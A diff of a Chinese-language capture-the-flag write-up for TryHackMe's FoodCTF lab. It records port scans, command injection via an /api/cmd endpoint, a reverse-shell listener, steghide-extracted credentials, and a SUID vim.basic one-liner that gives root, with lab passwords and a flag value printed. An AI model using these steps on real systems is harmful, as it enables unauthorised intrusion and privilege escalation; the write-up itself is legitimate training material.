@@ -4,10 +4,10 @@
 # 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
-└─# nmap -sV -Pn 10.10.146.186    
+└─# nmap -sV -Pn 10.10.2.134    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 03:09 EST
-Nmap scan report for 10.10.146.186
+Nmap scan report for 10.10.2.134
 Host is up (0.30s latency).
 Not shown: 997 closed ports
 PORT     STATE SERVICE VERSION
@@ -19,14 +19,14 @@ PORT     STATE SERVICE VERSION
 快速扫描，连个web服务都没有，却有mysql服务，怀疑在高端口存在http，全端口扫描一下：
 ```
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
-└─# nmap -sV -Pn 10.10.146.186 -p-
+└─# nmap -sV -Pn 10.10.2.134 -p-
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 03:11 EST
 Stats: 0:14:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 66.78% done; ETC: 03:34 (0:07:26 remaining)
 Stats: 0:22:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 50.00% done; ETC: 03:34 (0:00:32 remaining)
-Nmap scan report for 10.10.146.186
+Nmap scan report for 10.10.2.134
 Host is up (0.30s latency).
 Not shown: 65529 closed ports
 PORT      STATE SERVICE VERSION
@@ -42,25 +42,25 @@ PORT      STATE SERVICE VERSION
 > Site down for maintenance
 > Blame Dan, he keeps messing with the prod servers.
 
-现在我们知道有一个用户名叫做:```Dan```
+现在我们知道有一个开发者叫做:```Dan```
 
 用dan做用户名，爆破ssh和telnet，无果。
 
 ## 爆破15065目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.146.186:15065/
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.2.134:15065/
 
   _|. _ _  _  _  _ _|_    v0.4.2
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/dirsearch/reports/10.10.146.186-15065/-_21-11-09_03-48-30.txt
+Output File: /root/dirsearch/reports/10.10.2.134-15065/-_21-11-09_03-48-30.txt
 
 Error Log: /root/dirsearch/logs/errors-21-11-09_03-48-30.log
 
-Target: http://10.10.146.186:15065/
+Target: http://10.10.2.134:15065/
 
 [03:48:31] Starting: 
                
@@ -158,7 +158,7 @@ payload：
 ```
 POST /api/cmd HTTP/1.1
 
-Host: 10.10.146.186:15065
+Host: 10.10.2.134:15065
 
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 
@@ -170,7 +170,7 @@ Accept-Encoding: gzip, deflate
 
 Content-Type: text/plain
 
-Origin: http://10.10.146.186:15065
+Origin: http://10.10.2.134:15065
 
 Content-Length: 8
 
@@ -197,7 +197,7 @@ Connection: close
 
 
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
-        inet 10.10.146.186  netmask 255.255.0.0  broadcast 10.10.255.255
+        inet 10.10.2.134  netmask 255.255.0.0  broadcast 10.10.255.255
         inet6 fe80::53:b1ff:fe33:d9b3  prefixlen 64  scopeid 0x20<link>
         ether 02:53:b1:33:d9:b3  txqueuelen 1000  (Ethernet)
         RX packets 1225123  bytes 132078973 (132.0 MB)
@@ -224,7 +224,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
 └─# nc -lnvp 4242           
 listening on [any] 4242 ...
-connect to [10.13.21.169] from (UNKNOWN) [10.10.146.186] 46670
+connect to [10.13.21.169] from (UNKNOWN) [10.10.2.134] 46670
 id
 uid=1004(bread) gid=1004(bread) groups=1004(bread)
 whoami
@@ -249,9 +249,9 @@ cat: flag: Permission denied
 exiftool查看图片基本信息，binwalk查看图片组成，再用steghide命令分离出一个creds.txt文件
 ```
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
-└─# exiftool  10.10.146.186.jpeg 
+└─# exiftool  10.10.2.134.jpeg 
 ExifTool Version Number         : 12.16
-File Name                       : 10.10.146.186.jpeg
+File Name                       : 10.10.2.134.jpeg
 Directory                       : .
 File Size                       : 372 KiB
 File Modification Date/Time     : 2021:11:09 04:02:55-05:00
@@ -275,7 +275,7 @@ Image Size                      : 1350x900
 Megapixels                      : 1.2
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
-└─# binwalk 10.10.146.186.jpeg                     
+└─# binwalk 10.10.2.134.jpeg                     
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -284,7 +284,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
-└─# steghide extract -sf 10.10.146.186.jpeg 
+└─# steghide extract -sf 10.10.2.134.jpeg 
 Enter passphrase: 
 wrote extracted data to "creds.txt".
                                                                                                                                                                                                                                             
@@ -298,8 +298,8 @@ pasta:pastaisdynamic
 
 ```
 ┌──(root💀kali)-[~/tryhackme/FoodCTF]
-└─# ssh pasta@10.10.146.186                
-pasta@10.10.146.186's password: 
+└─# ssh pasta@10.10.2.134                
+pasta@10.10.2.134's password: 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -310,7 +310,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
   System load:  0.01              Processes:           91
   Usage of /:   43.9% of 9.78GB   Users logged in:     0
-  Memory usage: 35%               IP address for eth0: 10.10.146.186
+  Memory usage: 35%               IP address for eth0: 10.10.2.134
   Swap usage:   0%
 
 
@@ -322,7 +322,7 @@ Last login: Sat Mar 21 00:19:06 2020
 pasta@foodctf:~$ id
 uid=1002(pasta) gid=1002(pasta) groups=1002(pasta)
 ```
-
+# flag1
 在```/home/bread```下拿到flag1
 
 ```
@@ -378,6 +378,7 @@ mysql> show tables;
 
 ```
 
+# flag2
 拿到flag2和ramen的登录凭证
 ```
 mysql> select * from user;
@@ -399,4 +400,106 @@ Password:
 ramen@foodctf:/tmp$ id
 uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)
 
+```
+
+# flag3
+在```/home/food```下找到隐藏文件flag3
+```
+ramen@foodctf:/home/food$ cat .flag 
+thm{58a3cb46855af54d0660b34fd20a04c1}
+ramen@foodctf:/home/food$ pwd
+/home/food
+```
+
+# 提权到root
+
+查找所有SUID
+```
+ramen@foodctf:/tmp$ find / -perm -u=s -type f 2>/dev/null
+/bin/ping
+/bin/su
+/bin/umount
+/bin/mount
+/bin/fusermount
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/vim.basic
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/newgidmap
+/usr/bin/screen-4.5.0
+/usr/bin/chfn
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/telnetlogin
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/snap/core/7270/bin/mount
+/snap/core/7270/bin/ping
+/snap/core/7270/bin/ping6
+/snap/core/7270/bin/su
+/snap/core/7270/bin/umount
+/snap/core/7270/usr/bin/chfn
+/snap/core/7270/usr/bin/chsh
+/snap/core/7270/usr/bin/gpasswd
+/snap/core/7270/usr/bin/newgrp
+/snap/core/7270/usr/bin/passwd
+/snap/core/7270/usr/bin/sudo
+/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/7270/usr/lib/openssh/ssh-keysign
+/snap/core/7270/usr/lib/snapd/snap-confine
+/snap/core/7270/usr/sbin/pppd
+/snap/core/8689/bin/mount
+/snap/core/8689/bin/ping
+/snap/core/8689/bin/ping6
+/snap/core/8689/bin/su
+/snap/core/8689/bin/umount
+/snap/core/8689/usr/bin/chfn
+/snap/core/8689/usr/bin/chsh
+/snap/core/8689/usr/bin/gpasswd
+/snap/core/8689/usr/bin/newgrp
+/snap/core/8689/usr/bin/passwd
+/snap/core/8689/usr/bin/sudo
+/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8689/usr/lib/openssh/ssh-keysign
+/snap/core/8689/usr/lib/snapd/snap-confine
+/snap/core/8689/usr/sbin/pppd
+
+```
+
+我们留意到```/usr/bin/vim.basic```这个SUID有点特别，尝试用他打开```/etc/shadow/```,居然可以成功打开
+
+也就是说vim.basic其实是等价于vim的，因此我们可以利用它提权到root
+
+根据[gtfobins](https://gtfobins.github.io/gtfobins/vim/)上关于vim使用SUID提权指令，我们稍微修改一下：
+
+```
+ramen@foodctf:/tmp$ /usr/bin/vim.basic  -c ':python3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+Erase is control-H (^H).
+# id
+uid=1003(ramen) gid=1003(ramen) euid=0(root) egid=0(root) groups=0(root),1003(ramen)
+# whoami
+root
+# 
+
+```
+
+成功提权到root，由于我们已经拿到root权限，因此我们可以读到任意flag文件。
+```
+# find / -name *flag* -type f 2>/dev/null          
+/proc/sys/kernel/acpi_video_flags
+/proc/kpageflags
+/root/flag
+/home/tryhackme/flag7
+/home/bread/flag
+/home/food/.flag
+/var/flag.txt
+/var/lib/mysql/debian-5.7.flag
 ```
